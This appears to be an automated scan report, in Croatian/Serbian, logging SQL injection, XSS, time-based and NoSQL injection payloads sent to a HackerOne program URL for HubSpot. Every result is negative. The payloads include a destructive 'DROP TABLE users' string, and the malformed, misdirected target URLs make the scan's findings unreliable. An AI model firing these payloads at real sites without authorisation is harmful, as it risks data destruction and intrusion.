# SHADOWFOX MISIJA
**Meta:** https://hackerone.com/hubspot?type=team?test=' OR '1'='1
**Datum:** 2025-05-15 21:38

---

## Detalji napada

### SQL Injection Fuzzer
- **https://hackerone.com/hubspot?type=team?test=' OR '1'='1** → `{'status': 200, 'vulnerable': False}`
- **https://hackerone.com/hubspot?type=team?test=' OR 1=1--** → `{'status': 200, 'vulnerable': False}`
- **https://hackerone.com/hubspot?type=team?test='; DROP TABLE users; --** → `{'status': 200, 'vulnerable': False}`
- **https://hackerone.com/hubspot?type=team?test=' OR '1'='1' /*** → `{'status': 200, 'vulnerable': False}`
- **https://hackerone.com/hubspot?type=team?test=' UNION SELECT NULL, NULL, NULL--** → `{'status': 200, 'vulnerable': False}`

### XSS Fuzzer
- **https://hackerone.com/hubspot?type=team?xss=<script>alert('XSS')</script>** → `{'status': 200, 'reflected': False}`
- **https://hackerone.com/hubspot?type=team?xss='"><script>alert('XSS')</script>** → `{'status': 200, 'reflected': False}`
- **https://hackerone.com/hubspot?type=team?xss=<img src=x onerror=alert('XSS')>** → `{'status': 200, 'reflected': False}`
- **https://hackerone.com/hubspot?type=team?xss=<svg/onload=alert('XSS')>** → `{'status': 200, 'reflected': False}`
- **https://hackerone.com/hubspot?type=team?xss=<body onload=alert('XSS')>** → `{'status': 200, 'reflected': False}`

### Time-Based SQL Injection Fuzzer
- **https://hackerone.com/hubspot?type=team ('; WAITFOR DELAY '00:00:05'--)** → `0.6258 sec`
- **https://hackerone.com/hubspot?type=team (1' OR IF(1=1, sleep(5), null) --)** → `0.6403 sec`

### NoSQL Injection Fuzzer
- **https://hackerone.com/hubspot?type=team ({"$ne": ""})** → `SAFE`
- **https://hackerone.com/hubspot?type=team ({"$gt": ""})** → `SAFE`
- **https://hackerone.com/hubspot?type=team ({"$regex": ".*"})** → `SAFE`

---

**Ukupno pronađenih ranjivosti:** `0`

**Preporuka:** Pokrenuti dodatnu analizu i pripremiti AI patch modul.
